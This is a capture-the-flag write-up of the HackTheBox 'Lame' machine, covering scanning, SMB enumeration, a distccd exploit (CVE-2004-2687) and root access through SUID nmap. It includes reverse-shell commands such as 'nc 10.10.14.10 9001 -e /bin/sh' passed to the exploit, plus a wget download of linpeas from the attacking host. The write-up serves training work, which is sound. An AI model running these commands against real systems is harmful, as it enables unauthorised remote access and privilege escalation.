# Lame - 10.10.10.3

Started off with a nmap scan
``
nmap -Pn -T5 -sV -sC -A -p- -oN lame_nmap.txt 10.10.10.3
``
While that was scanning I went to go check out to see if the website is up. But I don't get anything back and you'll see why when the results are done.
We get back some nice info to start us off.
Port 80 isn't open so there was no site for me to check.\
But there was other ports open such as port 21 with the version number of <em><strong>vsftpd 2.3.4</em></strong> (This version of vsftpd is vulnerable to backdoor command execution
CVE-2011-2523) I couldn't get it to work though. So I moved on. If you can't get something to work, don't spend to much time on it. Look at the next route you can take and if you get stuck.\
again then go back and try to repeat your steps to make sure you didn't make a typo somewhere.

![image](https://user-images.githubusercontent.com/110210595/185813986-3fe1ff10-9b0e-46e6-873a-29d79fd5341e.png)

![image](https://user-images.githubusercontent.com/110210595/185813993-63e2b007-2ec3-4ea1-953e-a9c2db6975a5.png)

I see that smb is open. 139/445. I run ``
smbmap -H 10.10.10.
``and get back some users.

![image](https://user-images.githubusercontent.com/110210595/185814007-319d68bc-004b-4242-b3e0-a943b4eda8e9.png)

we can see that tmp is READ, WRITE. Lets login and see what we can find.\
I use ``smbclient \\\\10.10.10.3\\tmp markdown`` and we get a hit. \
I use ```markdown\  ls```  to see what we can find. Unfortunately there is nothing here either.\
We could use put and get files here but there is no port 80 open for us to execute the files to gain a shell from here. Some bad luck but we got more info so lets keep looking.

![image](https://user-images.githubusercontent.com/110210595/185814036-42698e61-b4e6-4be4-84de-df540f801f33.png)

I go back to the nmap results and see port 3632 is open and it gave us the version of application running.  <em><strong>distccd v1</em></strong>\
I go to google and search for "<em><strong>distccd v1 exploit</em></strong>" first link brings us to https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855 \
after reading the exploit it seems to generate a random alpha numeric string. Reads the string. And looks for the trigger exploit which is <em><strong>command, host, port</em></strong>\
If it is able to connect to the host it will send the payload and hopefully give us a reverse shell.

Let's give it a try. I started by copying the code and writing it to a file naming it CVE-2004-2687.py, did  ``` markdown chmod +x CVE-2004-2687.py ``` \
the file is ready to be used. First I started a listener on my attacking machine with ``` markdown nc -lvnp 9001 ``` and then used the following command \
``` markdown ./CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` No good, got errors. \
Then I tried. ``` markdown python3 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` I got a connected to remote service Ok but then the
socket timed out instantly killing the connection. I went back to the exploit and read the comments, it mentioned that python3 is to new.
So I was going to work my way down from python3 to python. \
Next up,  ``` markdown python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` Success, we get a shell!

![image](https://user-images.githubusercontent.com/110210595/185814122-93aa8ce3-0128-4f21-a19b-8d04b5580a30.png)

![image](https://user-images.githubusercontent.com/110210595/185814162-05876fb9-000c-4612-bcfc-bd4d8fc70e88.png)

Let's upgrade the shell. I used the following. \
``` markdown python -c 'import pty; pty.spawn("/bin/bash")' ``` python3 and python2 didn't work. \
``` markdown export TERM=xterm ``` \
``` markdown stty raw -echo && fg ``` \
``` markdown enter ``` \
``` markdown enter ``` \

We're a normal user daemon. I started off with ``` markdown sudo -l ``` but it asked for a password. Let's move on.
I look around a bit and ``` markdown cd /home ``` directory and do a ``` markdown ls ``` and see what's there. Nothing good in the user directory but I did go into makis and find the <em><strong>user.txt</em></strong> file. I do a cat user.txt at it and we get out our first flag.  

![image](https://user-images.githubusercontent.com/110210595/185814188-b2d3ad0a-a11d-4f7e-a4bc-49c2566b5fa1.png)

![image](https://user-images.githubusercontent.com/110210595/185814191-f868ba55-884e-4c9e-ba39-267b4ee7455c.png)

Next, let's head over to the tmp directory and try to transfer over some enumeration files like linpeas.sh \
I go to my attacking machine on my transfers directory where I store all my enumeration files, scripts, images, anything that can be used to help us get an edge on the victim machine. \
I use python3 -m http.server 80 get the server up and running. \
On the victim machine ill be in the /tmp directory and use wget://10.10.14.10/linpeas.sh which is my attacking machines ip from HackTheBox. \
The file gets transferred over no problem. I use the chmod +x linpeas.sh making it an executable file. \
I use ./linpeas.sh and it kicks off no problem. We get back a lot of results. Several vulnerabilities, but one in particular catches my eye with the yellow red highlight.

![image](https://user-images.githubusercontent.com/110210595/185814232-c92b51cf-c297-46b9-ad1f-ed45077f1d5d.png)

![image](https://user-images.githubusercontent.com/110210595/185814233-174d7a35-f050-4533-acd5-6fc6f51f48a7.png)

![image](https://user-images.githubusercontent.com/110210595/185814242-ca1ef7ad-efb5-47bd-8b56-bedfb902f6c7.png)

the /usr/bin/nmap suid \
I head over to https://gtfobins.github.io/ and search for nmap \
I cd /usr/bin where the suid is located. \
I start off with shell code (a) and nothing happened. So I keep going down the list. \
Shell (b) worked!

![image](https://user-images.githubusercontent.com/110210595/185814276-6c882b38-ce84-4183-a828-49b30153bc7a.png)

we can now cd /root and see what is there which is the root.txt flag! \
we have successfully rooted this box!

![image](https://user-images.githubusercontent.com/110210595/185814294-98c871d4-6e47-46cd-b258-79796039924c.png)

![image](https://user-images.githubusercontent.com/110210595/185814307-20443976-cd82-46bb-8929-1e17fb164988.png)
